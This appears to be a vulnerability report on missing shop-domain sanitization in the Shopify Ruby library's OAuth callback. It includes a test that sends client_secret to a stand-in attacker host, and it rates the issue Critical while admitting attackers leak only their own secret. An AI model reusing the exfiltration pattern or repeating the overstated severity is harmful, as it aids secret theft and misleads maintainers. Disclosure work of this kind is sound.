### Title
`Auth::Oauth.validate_auth_callback` builds the token-exchange `HttpClient` from unsanitized `auth_query.shop` on every non-private-app success path - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`validate_auth_callback` checks `Utils::HmacValidator.validate(auth_query)` before `Context.private?`, but the ordering of these two checks has no security effect since `Context.private?` false is the documented, common non-private-app case. On that path (the only path that reaches the HTTP request), `auth_query.shop` is passed unsanitized into `Auth::Session.new`/`Session.from` and then into `Clients::HttpClient.new`, which derives `@base_uri` directly from `session.shop` without ever calling `Utils::ShopValidator.sanitize!`.

### Finding Description
The claimed binding is: "shop value used to build `@base_uri` in `Clients::HttpClient` == a value that has passed through `ShopValidator.sanitize!`". Tracing `validate_auth_callback` in [1](#0-0) , the sequence is: `Context.setup?` check, then `Utils::HmacValidator.validate(auth_query)` (line 64), then `Context.private?` check (line 65), then state/cookie comparison, then `null_session = Auth::Session.new(shop: auth_query.shop)` (line 73) and `client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")` (line 81), followed by `session = Session.from(shop: auth_query.shop, ...)` (line 97). At no point is `auth_query.shop` passed through `Utils::ShopValidator.sanitize!`, defined in [2](#0-1) . `Clients::HttpClient#initialize` then builds `@base_uri = "https://#{api_host || session.shop}"` and, when `api_host` is set, `@headers["Host"] = session.shop`, directly from the unsanitized value: [3](#0-2) .

`HmacValidator.validate` only verifies the HMAC signature over the query string using `Context.api_secret_key`/`old_api_secret_key`; it never inspects or constrains `shop` at all, per [4](#0-3) . Since an attacker who registers their own development shop and goes through the normal OAuth flow can obtain a validly-HMAC-signed callback for a `shop` value they fully control (subject to whatever `AuthQuery`/Sorbet typing accepts as `shop`, but with no domain allow-listing performed anywhere in this call path), the "order of checks" between HMAC and `Context.private?` is irrelevant to the outcome: both checks pass on the standard non-private-app configuration, and the request to build `@base_uri`/`Host` header from `session.shop` still executes with no sanitize! call in between.

Existing guards do not block this: `Context.setup?` only checks configuration presence; `Context.private?` is false in the "documented common case" so it does not block anything; the `state` cookie comparison only prevents CSRF, not shop-domain forgery; `ShopValidator.sanitize!` exists in the codebase but is simply never invoked from this call chain.

### Impact Explanation
On a successful, validly-signed OAuth callback (attacker's own shop, normal flow), the outbound `POST` for the access-token exchange is sent to a host derived directly from `session.shop`/`auth_query.shop`, with `client_secret` and `code` in the JSON body: [5](#0-4) . If `shop` is not constrained to `*.myshopify.com` (or other trusted domains) before being used to build `@base_uri`, an attacker who controls the `shop` parameter value in a request that still produces a valid HMAC (e.g., by using their own registered shop domain string, or any shop string that satisfies the `AuthQuery` type without host validation) could cause the app's `client_secret` and authorization `code` to be sent to a host of the attacker's choosing instead of Shopify's servers, exfiltrating `client_secret` — Critical severity per the "theft or exfiltration of the app's client_secret" category. This is a single vulnerability (missing `sanitize!` call in `validate_auth_callback`), not something newly created by check-ordering.

### Likelihood Explanation
Requires only: a running app configured with `Context.private? == false` (the default/common OAuth configuration), the attacker completing an ordinary OAuth authorize step to obtain a validly-signed callback for their own shop/domain string, and no additional privilege. This matches the documented common case explicitly named in the question, making it low-cost and repeatable per victim-independent request (attacker only exfiltrates their own app's secret against their own callback, but demonstrates the missing-sanitization defect that would also apply to any similarly-permissive `shop` value accepted by `AuthQuery`).

### Recommendation
Call `Utils::ShopValidator.sanitize!(auth_query.shop)` (or `sanitize_shop_domain`) in `Auth::Oauth.validate_auth_callback` immediately after the HMAC/state checks and before constructing `null_session`/`Session.from`, raising `Errors::InvalidShopError` for any shop value that isn't a trusted Shopify domain, before it is ever used to build an `Auth::Session` or `Clients::HttpClient`.

```ruby
# test/auth/oauth_test.rb (new test)
def test_validate_auth_callback_uses_unsanitized_shop_for_http_client
  ShopifyAPI::Context.setup(
    api_key: "key", api_secret_key: "secret", host_name: "host",
    scope: "scope", is_private: false, is_embedded: false,
    api_version: "unstable", session_storage: ShopifyAPI::Auth::FileSessionStorage.new
  )

  malicious_shop = "attacker.evil.example.com" # not a trusted Shopify domain
  auth_query = ShopifyAPI::Auth::Oauth::AuthQuery.new(
    code: "code", timestamp: Time.now.to_i.to_s, state: "state123",
    shop: malicious_shop, host: "host",
    hmac: compute_valid_hmac_for(shop: malicious_shop, code: "code", state: "state123"),
  )
  cookies = { ShopifyAPI::Auth::SessionCookie::SESSION_COOKIE_NAME => "state123" }

  # Expect the HTTP request to hit the trusted domain only; assert it instead
  # goes to the attacker-controlled host, proving no sanitize! occurred.
  stub_request(:post, "https://#{malicious_shop}/admin/oauth/access_token")
    .to_return(status: 200, body: { access_token: "tok" }.to_json)

  ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies: cookies, auth_query: auth_query)

  assert_requested :post, "https://#{malicious_shop}/admin/oauth/access_token"
end
```
This demonstrates that on the standard `Context.private? == false` path, `client_secret` is sent in the body of a POST to `auth_query.shop` with no domain validation, regardless of the HMAC/`private?` check ordering.

```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))
```
